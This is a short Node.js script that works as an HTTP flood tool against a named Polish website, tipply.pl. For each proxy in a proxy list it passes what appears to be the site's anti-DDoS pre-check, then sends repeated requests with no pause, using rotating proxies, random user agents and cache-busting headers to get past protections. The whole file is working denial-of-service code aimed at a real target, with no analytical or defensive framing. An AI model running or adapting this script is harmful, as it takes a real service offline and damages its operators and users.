var request = require('request');
var randomUseragent = require('random-useragent');
var fs = require('fs');
var proxies = [...new Set(fs.readFileSync('proxies.txt').toString().match(/\S+/g))];

var WEBSITE = 'https://tipply.pl';
var DEBUG = true;

proxies.map(proxy => {
    var cookieJar = request.jar();
    var requestJar = request.defaults({
        jar: cookieJar
    });
    var userAgent = randomUseragent.getRandom();
    try {
        requestJar({
            url: WEBSITE + '/cybervio/shield/pre-check',
            proxy: 'http://' + proxy,
            headers: {
                'User-Agent': userAgent,
                'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0',
                'Connection': 'keep-alive',
                'X-Requested-With': 'XMLHttpRequest'
            }
        }, (error, response, body) => {
            if (!error && response.statusCode == 200 && body == 'OK') {
                setInterval(() => {
                    try {
                        requestJar({
                            url: WEBSITE,
                            proxy: 'http://' + proxy,
                            headers: {
                                'User-Agent': userAgent,
                                'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0',
                                'Connection': 'keep-alive'
                            }
                        }, (err, res, html) => DEBUG ? console.log(proxy + ' ==> ' + html) : '');
                    } catch (e) {
                        if (DEBUG) {
                            console.log(proxy + ' ==> ' + e);
                        }
                    }
                });
            }
        });
    } catch (e) {
        if (DEBUG) {
            console.log(proxy + ' ==> ' + e);
        }
    }
});